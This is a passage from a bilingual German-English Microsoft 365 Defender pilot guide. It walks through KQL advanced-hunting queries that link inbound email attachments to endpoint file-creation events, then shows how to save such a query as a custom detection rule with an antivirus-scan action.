5. <span data-ttu-id="d8402-330">Fügen Sie als Nächstes die Informationen zur Anlage (z. B. Dateiname, Hashes) in das Resultset ein.</span><span class="sxs-lookup"><span data-stu-id="d8402-330">Next, include the information about the attachment (such as: file name, hashes) to your result set.</span></span> <span data-ttu-id="d8402-331">Fügen Sie dazu der **Tabelle EmailAttachmentInfo** bei.</span><span class="sxs-lookup"><span data-stu-id="d8402-331">To do so, join the **EmailAttachmentInfo** table.</span></span> <span data-ttu-id="d8402-332">Die allgemeinen Felder, die für die Verknüpfung verwendet werden sollen, in diesem Fall sind **NetworkMessageId** und **RecipientObjectId**.</span><span class="sxs-lookup"><span data-stu-id="d8402-332">The common fields to use for joining, in this case are **NetworkMessageId** and **RecipientObjectId**.</span></span>

   <span data-ttu-id="d8402-333">Die folgende Abfrage enthält auch eine zusätzliche Zeile "| **project-rename EmailTimestamp=Timestamp**" that'll help identify which timestamp was related to the email versus timestamps related to file actions that you'll add in the next step.</span><span class="sxs-lookup"><span data-stu-id="d8402-333">The following query also includes an additional line "| **project-rename EmailTimestamp=Timestamp**" that'll help identify which timestamp was related to the email versus timestamps related to file actions that you'll add in the next step.</span></span>

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   ```

6. <span data-ttu-id="d8402-334">Verwenden Sie als Nächstes den **SHA256-Wert** aus der **EmailAttachmentInfo-Tabelle,** um **DeviceFileEvents** (Dateiaktionen, die auf dem Endpunkt aufgetreten sind) für diesen Hash zu suchen.</span><span class="sxs-lookup"><span data-stu-id="d8402-334">Next, use the **SHA256** value from the **EmailAttachmentInfo** table to find **DeviceFileEvents** (file actions that happened on the endpoint) for that hash.</span></span> <span data-ttu-id="d8402-335">Das allgemeine Feld hier ist der SHA256-Hash für die Anlage.</span><span class="sxs-lookup"><span data-stu-id="d8402-335">The common field here will be the SHA256 hash for the attachment.</span></span>

   <span data-ttu-id="d8402-336">Die resultierende Tabelle enthält nun Details vom Endpunkt (Microsoft Defender für Endpunkt), z. B. den Gerätenamen, welche Aktion ausgeführt wurde (in diesem Fall gefiltert, um nur FileCreated-Ereignisse einzuschließen), und wo die Datei gespeichert wurde.</span><span class="sxs-lookup"><span data-stu-id="d8402-336">The resulting table now includes details from the endpoint (Microsoft Defender for Endpoint) such as device name, what action was done (in this case, filtered to only include FileCreated events), and where the file was stored.</span></span> <span data-ttu-id="d8402-337">Der dem Prozess zugeordnete Kontoname wird ebenfalls eingeschlossen.</span><span class="sxs-lookup"><span data-stu-id="d8402-337">The account name associated with the process will also be included.</span></span>

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   | join DeviceFileEvents on SHA256
   | where ActionType == "FileCreated"
   ```

   <span data-ttu-id="d8402-338">Sie haben nun eine Abfrage erstellt, die alle eingehenden E-Mails identifiziert, in denen der Benutzer die Anlage geöffnet oder gespeichert hat.</span><span class="sxs-lookup"><span data-stu-id="d8402-338">You've now created a query that'll identify all inbound emails where the user opened or saved the attachment.</span></span> <span data-ttu-id="d8402-339">Sie können diese Abfrage auch verfeinern, um nach bestimmten Absenderdomänen, Dateigrößen, Dateitypen usw. zu filtern.</span><span class="sxs-lookup"><span data-stu-id="d8402-339">You can also refine this query to filter for specific sender domains, file sizes, file types, and so on.</span></span>

7. <span data-ttu-id="d8402-340">Funktionen sind eine besondere Art von Verknüpfung, mit der Sie mehr TI-Daten zu einer Datei wie Verbreitung, Signaturgeber- und Ausstellerinformationen usw. abrufen können. Um weitere Details zur Datei zu erhalten, verwenden Sie die **FileProfile()-Funktionserweiterung:**</span><span class="sxs-lookup"><span data-stu-id="d8402-340">Functions are a special kind of join, which let you pull more TI data about a file like its prevalence, signer and issuer info, etc. To get more details on the file, use the **FileProfile()** function enrichment:</span></span>

    ```console
    EmailEvents
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    | join DeviceFileEvents on SHA256
    | where ActionType == "FileCreated"
    | distinct SHA1
    | invoke FileProfile()
    ```

#### <a name="create-a-detection"></a><span data-ttu-id="d8402-341">Erstellen einer Erkennung</span><span class="sxs-lookup"><span data-stu-id="d8402-341">Create a detection</span></span>

<span data-ttu-id="d8402-342">Nachdem Sie eine Abfrage erstellt haben, die Informationen identifiziert, über die Sie **benachrichtigt werden** möchten, ob sie in der Zukunft auftreten, können Sie eine benutzerdefinierte Erkennung aus der Abfrage erstellen.</span><span class="sxs-lookup"><span data-stu-id="d8402-342">Once you have created a query that identifies information that you'd like to **get alerted** about if they happen in the future, you can create a custom detection from the query.</span></span>

<span data-ttu-id="d8402-343">Benutzerdefinierte Erkennungen führen die Abfrage entsprechend der von Ihnen festgelegten Häufigkeit aus, und die Ergebnisse der Abfragen erstellen Sicherheitswarnungen, basierend auf den betroffenen Ressourcen, die Sie auswählen.</span><span class="sxs-lookup"><span data-stu-id="d8402-343">Custom detections will run the query according to the frequency you set, and the results of the queries will create security alerts, based on the impacted assets you choose.</span></span> <span data-ttu-id="d8402-344">Diese Warnungen werden mit Vorfällen korreliert und können als jede andere Sicherheitswarnung, die von einem der Produkte generiert wird, triagediert werden.</span><span class="sxs-lookup"><span data-stu-id="d8402-344">Those alerts will be correlated to incidents and can be triaged as any other security alert generated by one of the products.</span></span>

1. <span data-ttu-id="d8402-345">Entfernen Sie auf der Abfrageseite die Zeilen 7 und 8, die in Schritt 7 der Go-Suchanweisungen hinzugefügt wurden, und klicken Sie auf **Erkennungsregel erstellen.**</span><span class="sxs-lookup"><span data-stu-id="d8402-345">On the query page, remove lines 7 and 8 that were added in step 7 of the Go hunting instructions and click **Create detection rule**.</span></span>

   ![Screenshot, in dem Sie auf der Seite "Erweiterte Suche" auf "Erkennungsregel erstellen" klicken können](../../media/mtp/fig22.png)

   > [!NOTE]
   > <span data-ttu-id="d8402-347">Wenn Sie auf **"Erkennungsregel erstellen"** klicken und in Ihrer Abfrage Syntaxfehler vorhanden sind, wird die Erkennungsregel nicht gespeichert.</span><span class="sxs-lookup"><span data-stu-id="d8402-347">If you click **Create detection rule** and you have syntax errors in your query, your detection rule won't be saved.</span></span> <span data-ttu-id="d8402-348">Überprüfen Sie Ihre Abfrage, um sicherzustellen, dass keine Fehler vorhanden sind.</span><span class="sxs-lookup"><span data-stu-id="d8402-348">Double-check your query to ensure there's no errors.</span></span>

2. <span data-ttu-id="d8402-349">Füllen Sie die erforderlichen Felder mit den Informationen aus, die es dem Sicherheitsteam ermöglichen, die Warnung zu verstehen, warum sie generiert wurde und welche Aktionen sie erwarten.</span><span class="sxs-lookup"><span data-stu-id="d8402-349">Fill in the required fields with the  information that will allow the security team to understand the alert, why it was generated, and what actions you expect them to take.</span></span>

   ![Screenshot der Seite "Erkennungsregel erstellen", auf der Sie die Warnungsdetails definieren können](../../media/mtp/fig23.png)

   <span data-ttu-id="d8402-351">Stellen Sie sicher, dass Sie die Felder mit Klarheit ausfüllen, um dem nächsten Benutzer eine fundierte Entscheidung über diese Warnung zur Erkennungsregel zu geben.</span><span class="sxs-lookup"><span data-stu-id="d8402-351">Ensure that you fill out the fields with clarity to help give the next user an informed decision about this detection rule alert</span></span>

3. <span data-ttu-id="d8402-352">Wählen Sie aus, welche Entitäten in dieser Warnung betroffen sind.</span><span class="sxs-lookup"><span data-stu-id="d8402-352">Select what entities are impacted in this alert.</span></span> <span data-ttu-id="d8402-353">Wählen Sie in diesem Fall **"Gerät** und **Postfach"** aus.</span><span class="sxs-lookup"><span data-stu-id="d8402-353">In this case, select **Device** and **Mailbox**.</span></span>

   ![Screenshot der Seite "Erkennungsregel erstellen", auf der Sie die Parameter der betroffenen Entitäten auswählen können](../../media/mtp/fig24.png)

4. <span data-ttu-id="d8402-355">Bestimmen Sie, welche Aktionen ausgeführt werden sollen, wenn die Warnung ausgelöst wird.</span><span class="sxs-lookup"><span data-stu-id="d8402-355">Determine what actions should take place if the alert is triggered.</span></span> <span data-ttu-id="d8402-356">Führen Sie in diesem Fall eine Antivirenüberprüfung aus, obwohl andere Aktionen ausgeführt werden konnten.</span><span class="sxs-lookup"><span data-stu-id="d8402-356">In this case, run an antivirus scan, though other actions could be taken.</span></span>

   ![Screenshot der Seite "Erkennungsregel erstellen", auf der Sie einen Antivirenscan ausführen können, wenn eine Warnung ausgelöst wird, um Bedrohungen zu begegnen](../../media/mtp/fig25.png)

5. <span data-ttu-id="d8402-358">Wählen Sie den Bereich für die Warnungsregel aus.</span><span class="sxs-lookup"><span data-stu-id="d8402-358">Select the scope for the alert rule.</span></span> <span data-ttu-id="d8402-359">Da diese Abfrage Geräte betrifft, sind die Gerätegruppen in dieser benutzerdefinierten Erkennung gemäß dem Microsoft Defender für Endpunktkontext relevant.</span><span class="sxs-lookup"><span data-stu-id="d8402-359">Since this query involve devices, the device groups are relevant in this custom detection according to Microsoft Defender for Endpoint context.</span></span> <span data-ttu-id="d8402-360">Beim Erstellen einer benutzerdefinierten Erkennung, die keine Geräte als betroffene Entitäten enthält, gilt der Bereich nicht.</span><span class="sxs-lookup"><span data-stu-id="d8402-360">When creating a custom detection that does not include devices as impacted entities, scope does not apply.</span></span>

   ![Screenshot der Seite "Erkennungsregel erstellen", auf der Sie den Bereich für die Warnungsregel festlegen können, verwaltet Ihre Erwartungen an die Ergebnisse, die Sie sehen werden](../../media/mtp/fig26.png)

   <span data-ttu-id="d8402-362">Bei diesem Pilotprojekt sollten Sie diese Regel auf eine Teilmenge der Testgeräte in Ihrer Produktionsumgebung beschränken.</span><span class="sxs-lookup"><span data-stu-id="d8402-362">For this pilot, you might want to limit this rule to a subset of testing devices in your production environment.</span></span>

6. <span data-ttu-id="d8402-363">Wählen Sie **Erstellen** aus.</span><span class="sxs-lookup"><span data-stu-id="d8402-363">Select **Create**.</span></span> <span data-ttu-id="d8402-364">Wählen Sie dann im Navigationsbereich **benutzerdefinierte Erkennungsregeln** aus.</span><span class="sxs-lookup"><span data-stu-id="d8402-364">Then, select **Custom detection rules** from the navigation panel.</span></span>

   ![Screenshot der Option "Benutzerdefinierte Erkennungsregeln" im Menü](../../media/mtp/fig27a.png)

   ![Screenshot der Seite "Erkennungsregeln", auf der die Regel- und Ausführungsdetails angezeigt werden](../../media/mtp/fig27b.png)

   <span data-ttu-id="d8402-367">Auf dieser Seite können Sie die Erkennungsregel auswählen, die eine Detailseite öffnet.</span><span class="sxs-lookup"><span data-stu-id="d8402-367">From this page, you can select the detection rule, which will open a details page.</span></span>

   ![Screenshot der Seite "E-Mail-Anlagen", auf der Sie den Status der Regelausführung, ausgelöste Warnungen und Aktionen, die Erkennung bearbeiten usw.](../../media/mtp/fig28.png)

### <a name="additional-advanced-hunting-walk-through-exercises"></a><span data-ttu-id="d8402-369">Zusätzliche exemplarische Übungen zur erweiterten Suche</span><span class="sxs-lookup"><span data-stu-id="d8402-369">Additional advanced hunting walk-through exercises</span></span>

<span data-ttu-id="d8402-370">Um mehr über die erweiterte Suche zu erfahren, werden Die folgenden Webcasts führen Sie durch die Funktionen der erweiterten Suche innerhalb Microsoft 365 Defender, um säulenübergreifende Abfragen zu erstellen, zu Entitäten zu pivotieren und benutzerdefinierte Erkennungs- und Korrekturaktionen zu erstellen.</span><span class="sxs-lookup"><span data-stu-id="d8402-370">To learn more about advanced hunting, the following webcasts will walk you through the capabilities of advanced hunting within Microsoft 365 Defender to create cross-pillar queries, pivot to entities and create custom detections and remediation actions.</span></span>

> [!NOTE]
> <span data-ttu-id="d8402-371">Bereiten Sie sich mit Ihrem eigenen GitHub Konto vor, um die Suchabfragen in Ihrer Pilottestumgebung auszuführen.</span><span class="sxs-lookup"><span data-stu-id="d8402-371">Be prepared with your own GitHub account to run the hunting queries in your pilot test lab environment.</span></span>

|<span data-ttu-id="d8402-372">Titel</span><span class="sxs-lookup"><span data-stu-id="d8402-372">Title</span></span>|<span data-ttu-id="d8402-373">Beschreibung</span><span class="sxs-lookup"><span data-stu-id="d8402-373">Description</span></span>|<span data-ttu-id="d8402-374">HERUNTERLADEN VON MP4</span><span class="sxs-lookup"><span data-stu-id="d8402-374">Download MP4</span></span>|<span data-ttu-id="d8402-375">Auf YouTube ansehen</span><span class="sxs-lookup"><span data-stu-id="d8402-375">Watch on YouTube</span></span>|<span data-ttu-id="d8402-376">ZU verwendende CSL-Datei</span><span class="sxs-lookup"><span data-stu-id="d8402-376">CSL file to use</span></span>|
|---|---|---|---|---|
|<span data-ttu-id="d8402-377">Folge 1: KQL-Grundlagen</span><span class="sxs-lookup"><span data-stu-id="d8402-377">Episode 1: KQL fundamentals</span></span>|<span data-ttu-id="d8402-378">Wir befassen uns mit den Grundlagen erweiterter Suchfunktionen in Microsoft 365 Defender.</span><span class="sxs-lookup"><span data-stu-id="d8402-378">We'll cover the basics of advanced hunting capabilities in Microsoft 365 Defender.</span></span> <span data-ttu-id="d8402-379">Erfahren Sie mehr über die verfügbaren erweiterten Suchdaten und die grundlegende KQL-Syntax und -Operatoren.</span><span class="sxs-lookup"><span data-stu-id="d8402-379">Learn about available advanced hunting data and basic KQL syntax and operators.</span></span>|[<span data-ttu-id="d8402-380">MP4</span><span class="sxs-lookup"><span data-stu-id="d8402-380">MP4</span></span>](https://aka.ms/MTP15JUL20_MP4)|[<span data-ttu-id="d8402-381">YouTube</span><span class="sxs-lookup"><span data-stu-id="d8402-381">YouTube</span></span>](https://youtu.be/0D9TkGjeJwM)|[<span data-ttu-id="d8402-382">Folge 1: CSL-Datei auf Git</span><span class="sxs-lookup"><span data-stu-id="d8402-382">Episode 1: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl)|
|<span data-ttu-id="d8402-383">Folge 2: Joins</span><span class="sxs-lookup"><span data-stu-id="d8402-383">Episode 2: Joins</span></span>|<span data-ttu-id="d8402-384">Wir werden weiterhin informationen zu Daten in der erweiterten Suche und zum Verknüpfen von Tabellen erhalten.</span><span class="sxs-lookup"><span data-stu-id="d8402-384">We'll continue learning about data in advanced hunting and how to join tables together.</span></span> <span data-ttu-id="d8402-385">Erfahren Sie mehr über innere, äußere, eindeutige und semi-Verknüpfungen und die Nuancen des standardmäßigen Kusto innerunique-Joins.</span><span class="sxs-lookup"><span data-stu-id="d8402-385">Learn about inner, outer, unique, and semi joins, and the nuances of the default Kusto innerunique join.</span></span>|[<span data-ttu-id="d8402-386">MP4</span><span class="sxs-lookup"><span data-stu-id="d8402-386">MP4</span></span>](https://aka.ms/MTP22JUL20_MP4)|[<span data-ttu-id="d8402-387">YouTube</span><span class="sxs-lookup"><span data-stu-id="d8402-387">YouTube</span></span>](https://youtu.be/LMrO6K5TWOU)|[<span data-ttu-id="d8402-388">Folge 2: CSL-Datei auf Git</span><span class="sxs-lookup"><span data-stu-id="d8402-388">Episode 2: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl)|
|<span data-ttu-id="d8402-389">Folge 3: Zusammenfassen, Pivotieren und Visualisieren von Daten</span><span class="sxs-lookup"><span data-stu-id="d8402-389">Episode 3: Summarizing, pivoting, and visualizing data</span></span>|<span data-ttu-id="d8402-390">Da wir nun Daten filtern, bearbeiten und verknüpfen können, ist es an der Zeit, mit der Zusammenfassung, Quantifizierung, Pivotierung und Visualisierung zu beginnen.</span><span class="sxs-lookup"><span data-stu-id="d8402-390">Now that we're able to filter, manipulate, and join data, it's time to start summarizing, quantifying, pivoting, and visualizing.</span></span> <span data-ttu-id="d8402-391">In dieser Folge behandeln wir den Zusammenfassungsoperator und einige der Berechnungen, die Sie ausführen können, während Sie in zusätzliche Tabellen im Schema für die erweiterte Suche wechseln.</span><span class="sxs-lookup"><span data-stu-id="d8402-391">In this episode, we'll cover the summarize operator and some of the calculations you can perform while diving into additional tables in the advanced hunting schema.</span></span> <span data-ttu-id="d8402-392">Wir wandeln unsere Datasets in Diagramme um, die zur Verbesserung der Analyse beitragen können.</span><span class="sxs-lookup"><span data-stu-id="d8402-392">We turn our datasets into charts that can help improve analysis.</span></span>|[<span data-ttu-id="d8402-393">MP4</span><span class="sxs-lookup"><span data-stu-id="d8402-393">MP4</span></span>](https://aka.ms/MTP29JUL20_MP4)|[<span data-ttu-id="d8402-394">YouTube</span><span class="sxs-lookup"><span data-stu-id="d8402-394">YouTube</span></span>](https://youtu.be/UKnk9U1NH6Y)|[<span data-ttu-id="d8402-395">Folge 3: CSL-Datei auf Git</span><span class="sxs-lookup"><span data-stu-id="d8402-395">Episode 3: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl)|
|<span data-ttu-id="d8402-396">Folge 4: Lassen Sie uns suchen!</span><span class="sxs-lookup"><span data-stu-id="d8402-396">Episode 4: Let's hunt!</span></span> <span data-ttu-id="d8402-397">Anwenden von KQL auf die Vorfallverfolgung</span><span class="sxs-lookup"><span data-stu-id="d8402-397">Applying KQL to incident tracking</span></span>|<span data-ttu-id="d8402-398">Zeit zum Nachverfolgen einiger Angreiferaktivitäten!</span><span class="sxs-lookup"><span data-stu-id="d8402-398">Time to track some attacker activity!</span></span> <span data-ttu-id="d8402-399">In dieser Folge verwenden wir unser verbessertes Verständnis von KQL und die erweiterte Suche in Microsoft 365 Defender, um einen Angriff nachzuverfolgen.</span><span class="sxs-lookup"><span data-stu-id="d8402-399">In this episode, we'll use our improved understanding of KQL and advanced hunting in Microsoft 365 Defender to track an attack.</span></span> <span data-ttu-id="d8402-400">Erfahren Sie mehr über die Tipps und Tricks, die in diesem Feld zum Nachverfolgen von Angreiferaktivitäten verwendet werden, einschließlich der ABCs der Cybersicherheit und deren Anwendung auf die Reaktion auf Vorfälle.</span><span class="sxs-lookup"><span data-stu-id="d8402-400">Learn some of the tips and tricks used in the field to track attacker activity, including the ABCs of cybersecurity and how to apply them to incident response.</span></span>|[<span data-ttu-id="d8402-401">MP4</span><span class="sxs-lookup"><span data-stu-id="d8402-401">MP4</span></span>](https://aka.ms/MTP5AUG20_MP4)|[<span data-ttu-id="d8402-402">YouTube</span><span class="sxs-lookup"><span data-stu-id="d8402-402">YouTube</span></span>](https://youtu.be/2EUxOc_LNd8)|[<span data-ttu-id="d8402-403">Folge 4: CSL-Datei auf Git</span><span class="sxs-lookup"><span data-stu-id="d8402-403">Episode 4: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl)|
|

## <a name="next-step"></a><span data-ttu-id="d8402-404">Nächster Schritt</span><span class="sxs-lookup"><span data-stu-id="d8402-404">Next step</span></span>

|<span data-ttu-id="d8402-405">![Abschluss- und Zusammenfassungsphase](../../media/mtp/close.png)</span><span class="sxs-lookup"><span data-stu-id="d8402-405">![Closing and summary phase](../../media/mtp/close.png)</span></span> <br>[<span data-ttu-id="d8402-406">Abschluss- und Zusammenfassungsphase</span><span class="sxs-lookup"><span data-stu-id="d8402-406">Closing and summary phase</span></span>](m365d-pilot-close.md)|<span data-ttu-id="d8402-407">Analysieren Sie Ihre Microsoft 365 Defender Pilotergebnisse, stellen Sie sie Ihren Projektbeteiligten vor, und führen Sie den nächsten Schritt aus.</span><span class="sxs-lookup"><span data-stu-id="d8402-407">Analyze your Microsoft 365 Defender pilot outcome, present them to your stakeholders, and take the next step.</span></span>
|:-----|:-----|
